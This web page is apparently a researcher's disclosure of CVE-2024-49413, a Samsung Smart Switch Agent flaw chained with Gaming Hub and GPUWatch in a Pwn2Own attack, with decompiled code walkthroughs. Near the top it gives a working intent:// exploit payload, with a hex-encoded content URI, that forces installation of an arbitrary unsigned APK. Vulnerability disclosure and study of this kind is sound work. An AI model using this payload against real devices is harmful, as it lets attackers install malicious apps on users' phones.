<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <!-- Begin Jekyll SEO tag v2.8.0 -->
<title>Samsung SmartSwitch Cryptographic Signature Bypass - CVE-2024-49413 | Malicious Erection LLC</title>
<meta name="generator" content="Jekyll v4.4.1" />
<meta property="og:title" content="Samsung SmartSwitch Cryptographic Signature Bypass - CVE-2024-49413" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="Improper Verification of Cryptographic Signature in SmartSwitch prior to SMR Dec-2024 Release 1 allows local attackers to install malicious applications." />
<meta property="og:description" content="Improper Verification of Cryptographic Signature in SmartSwitch prior to SMR Dec-2024 Release 1 allows local attackers to install malicious applications." />
<link rel="canonical" href="https://maliciouserection.com/cves/2024-12-01_cve-2024-49413/" />
<meta property="og:url" content="https://maliciouserection.com/cves/2024-12-01_cve-2024-49413/" />
<meta property="og:site_name" content="Malicious Erection LLC" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2024-12-01T00:00:00+00:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="Samsung SmartSwitch Cryptographic Signature Bypass - CVE-2024-49413" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2024-12-01T00:00:00+00:00","datePublished":"2024-12-01T00:00:00+00:00","description":"Improper Verification of Cryptographic Signature in SmartSwitch prior to SMR Dec-2024 Release 1 allows local attackers to install malicious applications.","headline":"Samsung SmartSwitch Cryptographic Signature Bypass - CVE-2024-49413","mainEntityOfPage":{"@type":"WebPage","@id":"https://maliciouserection.com/cves/2024-12-01_cve-2024-49413/"},"publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"https://maliciouserection.com/assets/images/logo.png"}},"url":"https://maliciouserection.com/cves/2024-12-01_cve-2024-49413/"}</script>
<!-- End Jekyll SEO tag -->

    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
    <link
      href="https://fonts.googleapis.com/css2?family=Work+Sans&display=swap"
      rel="stylesheet"
    />
    <link
      rel="stylesheet"
      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css"
    />
    <link rel="stylesheet" href="/assets/css/main.css" />
  </head>

  <body class="flex flex-col h-screen antialiased">
    <div 
  class="flex-none bg-base-100 shadow-sm h-20 navbar"
  style="height: 10rem;"
>
  <div 
    class="flex-none navbar-start"
    style="height: 9rem;"
  >
    <div class="shadow-lg dropdown">
      <div tabindex="0" role="button" class="lg:hidden btn btn-ghost">
        <svg
          xmlns="http://www.w3.org/2000/svg"
          class="w-5 h-5"
          fill="none"
          viewBox="0 0 24 24"
          stroke="currentColor"
        >
          <path
            stroke-linecap="round"
            stroke-linejoin="round"
            stroke-width="2"
            d="M4 6h16M4 12h8m-8 6h16"
          />
        </svg>
      </div>
      <ul
        tabindex="0"
        class="z-[1] space-y-5 bg-base-100 shadow mt-3 p-2 rounded-box w-72 menu menu-sm dropdown-content"
      >
        
        <li class="text-secondary text-lg">
          <a href="/">Home</a>
        </li>
        
        <li class="text-secondary text-lg">
          <a href="/blog">Blog</a>
        </li>
        
        <li class="text-secondary text-lg">
          <a href="/tools">Tools</a>
        </li>
        
        <li class="text-secondary text-lg">
          <a href="/vulnerability-disclosure-policy">Vulnerability Disclosure Policy</a>
        </li>
        
        <li class="text-secondary text-lg">
          <a href="/cves">CVEs</a>
        </li>
        
      </ul>
    </div>
    <a 
      href="/" 
      title="Malicious Erection LLC" 
      class="px-5"
      style="height: 7rem;"
    >
      <img
        src="/assets/images/logo.png"
        alt="Malicious Erection LLC"
        class="w-32 object-center image-center"
        style="width: 15rem;"
      />
    </a>
  </div>
  <div class="hidden lg:flex flex-1 gap-3 navbar-end">
    <ul class="gap-3 px-1 menu menu-horizontal">
      
      <li class="font-semibold text-base">
        <a href="/">Home</a>
      </li>
      
      <li class="font-semibold text-base">
        <a href="/blog">Blog</a>
      </li>
      
      <li class="font-semibold text-base">
        <a href="/tools">Tools</a>
      </li>
      
      <li class="font-semibold text-base">
        <a href="/vulnerability-disclosure-policy">Vulnerability Disclosure Policy</a>
      </li>
      
      <li class="font-semibold text-base">
        <a href="/cves">CVEs</a>
      </li>
      
    </ul>
  </div>
</div>

    <div class="flex-1 overflow-y-auto">
      <div class="min-h-[80vh]"><main>
  <!-- Header Section -->
  <section class="flex justify-center items-center bg-secondary/75 py-16">
    <h1 class="font-bold text-neutral-content text-5xl text-center">Samsung SmartSwitch Cryptographic Signature Bypass - CVE-2024-49413</h1>
  </section>

  <!-- Content Section -->
  <section class="mx-auto py-10 text-neutral-content prose px-4 sm:px-6 lg:px-8 max-w-full lg:max-w-5xl xl:max-w-[1100px]">
    <p>The below snippet is taken from the full white paper, available here: <a href="/2025/05/13/pwn2own-ireland-2024-samsung-s24-attack-chain-whitepaper.html">https://maliciouserection.com/2025/05/13/pwn2own-ireland-2024-samsung-s24-attack-chain-whitepaper.html</a></p>

<p>I think you should read the white paper instead :)</p>

<hr />

<h4 id="exploit-code">Exploit Code</h4>

<p>The following payload is sent from <attackerServer> to force Gaming Hub to launch Smart Switch Agent:</attackerServer></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>intent://#Intent;component=com.sec.android.easyMover.Agent/.ui.SsmUpdateCheckActivity;action=com.sec.android.easyMover.Agent.WATCH_INSTALL_SMART_SWITCH;S.MODE=DIALOG;S.ssm_action=yayactionyay;S.ssm_uri=%63%6f%6e%74%65%6e%74%3a%2f%2f%63%6f%6d%2e%73%61%6d%73%75%6e%67%2e%67%70%75%77%61%74%63%68%61%70%70%2e%48%74%6d%6c%44%75%6d%70%50%72%6f%76%69%64%65%72%2f%79%61%79%2e%61%70%6b;end;
</code></pre></div></div>

<p>NOTE: the <code class="language-plaintext highlighter-rouge">ssm_uri</code> value is set to a custom value that is specific to this exploit chain.</p>

<h4 id="exploit-details">Exploit Details</h4>

<p>The application “Smart Switch Agent” (<code class="language-plaintext highlighter-rouge">com.sec.android.easyMover.Agent</code> version 2.0.02.24) is a background application that runs alongside the Smart Switch application. When transferring data between an old phone and a new Samsung phone, the Smart Switch Agent helps facilitate the installation of applications on the new phone.</p>

<p>One of the exported Activities, <code class="language-plaintext highlighter-rouge">com.sec.android.easyMover.Agent.ui.SsmUpdateCheckActivity</code>, is protected by a custom permission, com.wssnps.permission.COM_WSSNPS. However, Gaming Hub also uses this permission, making it possible for Gaming Hub to launch the <code class="language-plaintext highlighter-rouge">SsmUpdateCheckActivity</code> Activity.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?xml version="1.0" encoding="utf-8"?&gt;
&lt;manifest xmlns:android="http://schemas.android.com/apk/res/android"
    android:versionCode="710107000"
    android:versionName="7.1.01.7"
    ...
    package="com.samsung.android.game.gamehome"
    ...
    &lt;uses-permission android:name="com.wssnps.permission.COM_WSSNPS"/&gt;
</code></pre></div></div>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?xml version="1.0" encoding="utf-8"?&gt;
&lt;manifest xmlns:android="http://schemas.android.com/apk/res/android"
    android:versionCode="200200024"
    android:versionName="2.0.02.24"
    ...
    package="com.sec.android.easyMover.Agent"
    ...
    &lt;activity android:name="com.sec.android.easyMover.Agent.ui.SsmUpdateCheckActivity"
            android:permission="com.wssnps.permission.COM_WSSNPS"
            android:exported="true"
            android:excludeFromRecents="true"
            android:screenOrientation="portrait"
            android:configChanges="smallestScreenSize|screenSize|screenLayout|orientation"&gt;
            &lt;intent-filter&gt;
                &lt;action android:name="com.sec.android.easyMover.Agent.WATCH_INSTALL_SMART_SWITCH"/&gt;
                &lt;category android:name="android.intent.category.DEFAULT"/&gt;
            &lt;/intent-filter&gt;
        &lt;/activity&gt;
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">SsmUpdateCheckActivity</code> first checks that the incoming Intent contains a specific Action, and assigns the Intent String extra “MODE” to the static String variable <code class="language-plaintext highlighter-rouge">r</code>. If the Action value does not match a specific value, then the Activity finishes.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>public class SsmUpdateCheckActivity extends p {
    ...
    public final void onCreate(Bundle bundle) {
        ...
        Intent intent = getIntent();
        if (intent == null) {
            finish();
        } else {
            this.q = intent.getAction();
            this.r = intent.getStringExtra("MODE");
            if (!"com.sec.android.easyMover.Agent.WATCH_INSTALL_SMART_SWITCH".equals(this.q)) {
                Log.w("[SmartSwitchAgent]SsmUpdateCheckActivity", "Undefined action! - " + this.q);
                finish();
    ...
</code></pre></div></div>

<p>Continuing down <code class="language-plaintext highlighter-rouge">SsmUpdateCheckActivity</code>, a new Intent object is created and the target Component value is dependent on the value of the String extra “MODE”. For our exploit chain, our “MODE” value is set to “DIALOG”, which will set the Intent object’s Component to <code class="language-plaintext highlighter-rouge">com.sec.android.easyMover.Agent.ui.SsmUpdatePkgDialog</code>.</p>

<p>All of the incoming Intent’s extras are added to the newly created Intent object. Then <code class="language-plaintext highlighter-rouge">startActivity(Intent)</code> is executed against the newly created Intent object.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>public class SsmUpdateCheckActivity extends p {
    ...
    public final void onResume() {
        ...
        if ("DIALOG".equals(this.r)) {
            Intent yayintentyay = new Intent(this.o, (Class&lt;?&gt;) SsmUpdatePkgDialog.class);
            yayintentyay.setAction(getIntent().getAction());
            yayintentyay.replaceExtras(getIntent());
            yayintentyay.addFlags(33554432);
            startActivity(yayintentyay);
            finish();
            return;
        }
</code></pre></div></div>

<p>When <code class="language-plaintext highlighter-rouge">SsmUpdatePkgDialog</code> receives the Intent object, it passes the object to class <code class="language-plaintext highlighter-rouge">s4.c</code> and sets some static variables based on the Intent object’s extras. Two of these parameters are of interest:</p>

<p>• <code class="language-plaintext highlighter-rouge">ssm_action</code> which is saved to the static variable <code class="language-plaintext highlighter-rouge">j</code>
• <code class="language-plaintext highlighter-rouge">ssm_uri</code> which is saved to the static variable <code class="language-plaintext highlighter-rouge">k</code></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>public class SsmUpdatePkgDialog extends n {
...
    public final void onCreate(Bundle bundle0) {
        ...
        this.q = new c(this.getIntent());
        ...
</code></pre></div></div>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>public final class c {
...
    public c(Intent intent) {
        ...
        this.j = intent.getStringExtra("ssm_action");
        this.k = intent.getStringExtra("ssm_uri");
        ...
</code></pre></div></div>

<p>The <code class="language-plaintext highlighter-rouge">ssm_uri</code> value / static <code class="language-plaintext highlighter-rouge">k</code> variable is then read by class <code class="language-plaintext highlighter-rouge">l.n3</code> method <code class="language-plaintext highlighter-rouge">run()</code> and passes the value to class <code class="language-plaintext highlighter-rouge">l4.u</code> method <code class="language-plaintext highlighter-rouge">g(String, String)</code>. From there, the value is passed to class <code class="language-plaintext highlighter-rouge">s4.a</code> method <code class="language-plaintext highlighter-rouge">k(Context, String, String, b)</code>.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>public final class n3 implements Runnable {
...
    public final void run() {
    ...
        case 7:
                SsmUpdatePkgActivity ssmUpdatePkgActivity = (SsmUpdatePkgActivity) obj;
                ...
                StringBuilder sb = new StringBuilder();
                sb.append(ssmUpdatePkgActivity.o.getFilesDir());
                ssmUpdatePkgActivity.p.g(o2.e(sb, File.separator, "SmartSwitchMobile.apk"), ssmUpdatePkgActivity.q.k);
</code></pre></div></div>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>public final class u {
...
    public final void g(String yaydestinationyay, String yayssmuriyay) {
    ...
        if (!a.k(this.m, yaydestinationyay, yayssmuriyay, new b(this))) {
        ...
</code></pre></div></div>

<p>In class <code class="language-plaintext highlighter-rouge">s4.a</code> method <code class="language-plaintext highlighter-rouge">k(Context, String, String, b)</code>, the Easy Mover Agent application will try to reach out to the URI defined by <code class="language-plaintext highlighter-rouge">ssm_uri</code> via <code class="language-plaintext highlighter-rouge">context.getContentResolver().openInputStream(Uri)</code>. If the open is successful, then Easy Mover Agent will attempt to download/copy the file to Easy Mover Agent’s internal files directory as the file “SmartSwitchMobile.apk”.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>public abstract class a {
...
    public static boolean k(Context context0, String yaydestinationyay, String yayssmuriyay, b b0) {
        ...
        InputStream inputStream0;
        ...
        Uri yayuriyay = Uri.parse(yayssmuriyay);
        ...
        try {
            bufferedInputStream0 = null;
            inputStream0 = context0.getContentResolver().openInputStream(yayuriyay);
        }
        ...
        
</code></pre></div></div>

<p>After the file is downloaded and saved as “SmartSwitchMobile.apk”, Easy Mover Agent will automatically attempt to install the saved .apk file.</p>

<div align="center">
    <img src="/assets/images/blog/2025-05-13-pwn2own-ireland-2024-samsung-s24-attack-chain-whitepaper/pwn2own-ireland-2024-whitepaper-5.png" />
</div>

<p>After the application is installed, Easy Mover Agent will create a new Intent object with an Action value set by <code class="language-plaintext highlighter-rouge">ssm_action</code> / static variable <code class="language-plaintext highlighter-rouge">j</code>. Easy Mover Agent will then run <code class="language-plaintext highlighter-rouge">startActivity(Intent)</code> against this Intent object.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>public final class c {
...
    public final Intent a(Context context) {
        ...
        String yayactionyay = this.j;
        return TextUtils.isEmpty(yayactionyay) ? context.getPackageManager().getLaunchIntentForPackage("com.sec.android.easyMover") : new Intent(yayactionyay);
    }
</code></pre></div></div>

<h4 id="bug-5--easy-mover-agent-does-not-check-the-validity-of-smartswitchmobileapk-before-installing-the-apk-file">BUG 5 – Easy Mover Agent does not check the validity of “SmartSwitchMobile.apk” before installing the .apk file</h4>

<p>Based on the name of the saved file, it can be deduced that the application expects a specific application developed by Samsung. If so, then the application should be checking if the .apk file is signed by Samsung’s certificate. Without this check, it is possible to force Easy Mover Agent to install any .apk file saved to the Android device.</p>

<p>At this point in our exploit chain, the Drozer .apk file should be downloaded to <code class="language-plaintext highlighter-rouge">/storage/emulated/0/GPUWatch_Dump/html/</code>. However, Easy Mover Agent does not have access to the <code class="language-plaintext highlighter-rouge">/storage/emulated/0</code> directory since it lacks the proper Android permissions.</p>

<p>However, the application GPUWatch (<code class="language-plaintext highlighter-rouge">com.samsung.gpuwatchapp version</code> 2.1.2) contains an exported Content Provider that allows applications to download files from the directory <code class="language-plaintext highlighter-rouge">/storage/emulated/0/GPUWatch_Dump/html/</code>.</p>

<p>So to force Easy Mover Agent to install the Drozer .apk file, the URI passed to <code class="language-plaintext highlighter-rouge">SsmUpdateCheckActivity</code> must be set to GPUWatch’s Content Provider.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssm_uri=%63%6f%6e%74%65%6e%74%3a%2f%2f%63%6f%6d%2e%73%61%6d%73%75%6e%67%2e%67%70%75%77%61%74%63%68%61%70%70%2e%48%74%6d%6c%44%75%6d%70%50%72%6f%76%69%64%65%72%2f%79%61%79%2e%61%70%6b

Decoded:

ssm_uri=content://com.samsung.gpuwatchapp.HtmlDumpProvider/yay.apk
</code></pre></div></div>

<p>After Drozer is launched, Drozer can be launched via one of the following methods:</p>

<ul>
  <li>Set <code class="language-plaintext highlighter-rouge">ssm_action</code> to an Action value that is registered by Drozer
    <ul>
      <li>For our exploit chain, we will not be using this method since Drozer does not register a unique Action value</li>
      <li>Creating a new Drozer .apk requires Google Play to scan the app before it can be installed on the Samsung device</li>
      <li>I’m writing this whitepaper 4 days before the Pwn2Own entry is due, and I don’t want to risk pissing off Google Play</li>
    </ul>
  </li>
  <li>Use Gaming Hub to launch Drozer via new Intent
    <ul>
      <li>This is the method we use in our exploit chain</li>
    </ul>
  </li>
</ul>

  </section>

  <!-- CTA Button (optional) -->
  
</main>
</div>
      <div class="bg-neutral-800">
  <footer class="mx-auto py-10 container">
    <div class="flex flex-wrap justify-center gap-3 mb-10 align-center">
      
      <a href="/" class="btn btn-secondary btn-ghost"
        >Home</a
      >
      
      <a href="/blog/" class="btn btn-secondary btn-ghost"
        >Blog</a
      >
      
      <a href="/tools" class="btn btn-secondary btn-ghost"
        >Tools</a
      >
      
      <a href="/vulnerability-disclosure-policy" class="btn btn-secondary btn-ghost"
        >Vulnerability Disclosure Policy</a
      >
      
      <a href="/cves/" class="btn btn-secondary btn-ghost"
        >CVEs</a
      >
      
    </div>
    <div class="flex justify-center items-center gap-3 mb-10">
      
      <a
        title="Github"
        href="https://github.com/MaliciousErection"
        class="btn btn-ghost btn-circle"
      >
        <i class="fa fa-github text-xl"></i>
      </a>
      
    </div>
    <p class="text-center">© 2025 Malicious Erection LLC.</p>
  </footer>
</div>

    </div>
  </body>
</html>
